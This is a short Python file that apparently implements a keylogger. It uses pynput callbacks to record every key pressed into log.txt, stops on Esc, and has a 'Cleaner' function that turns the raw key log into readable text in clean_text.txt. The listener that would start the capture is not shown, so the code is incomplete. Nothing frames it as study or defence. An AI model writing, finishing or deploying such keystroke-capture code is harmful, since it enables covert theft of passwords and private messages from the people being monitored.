
from pynput.keyboard import Key;

keys = [];

def keypress(key):
    keys.append(key)
    to_string(keys);

def to_string (keys):
    with open('log.txt', 'w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(key);

def key_depressed(key):
    if key == Key.esc:
        return False;

def Cleaner (brute_register):

    complete_text = ''.join(brute_register)
    clean_text = complete_text.split('Key.space')
    clean_text = [part.replace('space', ' ').replace('backspace', '').replace('caps_lock', '').replace('shift', '').replace('tabKey', '').replace('ctrl_rKey', '').replace('Key.', '').replace('back', '') for part in clean_text]
    final_text = ' '.join(clean_text)

    with open('clean_text.txt', 'w', encoding='utf-8') as archivo:
     archivo.write(final_text)
    


